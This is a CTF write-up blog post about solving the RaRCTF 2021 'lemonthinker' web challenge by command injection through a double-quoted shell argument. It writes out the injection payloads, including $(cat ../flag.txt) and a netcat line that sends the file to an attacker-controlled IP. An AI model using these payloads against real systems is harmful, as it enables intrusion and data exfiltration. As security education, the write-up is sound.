---
layout: post
title: lemon thinker rarctf 2021 Web Challenges Writeup                               # Title of the page
hide_title: false                                  # Hide the title when displaying the post, but shown in lists of posts
feature-img: "assets/img/writeups/lemon-thinker/Screenshot_1.png"              # Add a feature-image to the post
thumbnail: "assets/img/writeups/lemon-thinker/Screenshot_1.png"  # Add a thumbnail image on blog view
color: dufault                            # Add the specified color as feature image, and change link colors in post
bootstrap: true                                   # Add bootstrap to the page
author: abdoghazy
excerpt_separator: <!--more-->
tags: [ctf, writeup, Web]
---
<h1>lemon thinker rarctf 2021 Web Challenges Writeup </h1>  
 <!--more-->

Hello all , we hope all of you is well 
This writeup is from Abdoghazy , Mohamed Tarek
Today we will explain how we could solve lemonthinker web challenge from rarctf .

<img src="https://github.com/0xL4ugh/0xl4ugh.github.io/raw/main/assets/img/writeups/lemon-thinker/Screenshot_1.png" /> 

As we See This is an input and "Generate Your lemonthinker" 
after trying it we got this photo
 
<img src="https://github.com/0xL4ugh/0xl4ugh.github.io/raw/main/assets/img/writeups/lemon-thinker/Screenshot_2.png" /> 

note that the source code is attached so let's see what inisde it 
<img src="https://github.com/0xL4ugh/0xl4ugh.github.io/raw/main/assets/img/writeups/lemon-thinker/Screenshot_3.png" /> 

As we see at line 24 it takes the name from me and passes it to the command that running another script
and there is no filtertion for the input that passes into the command so for sure we thought it's a command injection
note that the os is linux 
the command : python3 generate.py {filename} \"{text}\" 
the user input will be insted of {text} so we will inject there 

as always we tried these payloads : ;id , ||whoami , &&id

but unforently it's not working with us then we see that the input is passes into "" two double qoutes 
so our payloads didn't working and as we learn at bash we could execute commands from this "$(ls)"
and when we tried it we got the response from the server Alhamdullah

<img src="https://github.com/0xL4ugh/0xl4ugh.github.io/raw/main/assets/img/writeups/lemon-thinker/Screenshot_4.png" /> 

note : we tried to get reverse shell but no waaay :(
so after this let's read the flag !!

note that we got that the flag is in ../flag.txt from the source 

so i tried :  $(cat ../flag.txt) and it returned this photo :

<img src="https://github.com/0xL4ugh/0xl4ugh.github.io/raw/main/assets/img/writeups/lemon-thinker/Screenshot_5.png" /> 

so let's read the source of generate.py to know why 

<img src="https://github.com/0xL4ugh/0xl4ugh.github.io/raw/main/assets/img/writeups/lemon-thinker/Screenshot_6.png" /> 

as you see at line 39 if the rarctf in the respone it will give us the image that we see
so i tried to use this command : $(rev ../flag.txt)  and got this response !

pic 7 

as you see we cannot read more than 18 char and there is many chars (it's more that 70 char :) )
so there is two ways to read the flag : 

First Way to use this command to read the flag part by part : $(cat ../flag.txt | cut -c 0-3) 

Then The Second Way and i think it's an amazing way xD 
after we solved it by the first way i had to travel to my Collage and when i on my way i got this idea ;)
i know when two hosts just connected togheter in same port by nc they could contact like a Chat :D 
so what if we tried to open listner on port 4444 and tried to sent the flag on it by this command 

$(rev ../flag.txt | nc ip port )
and we got the full flag by one Command Alhamdullah :D 3> 

last pic 
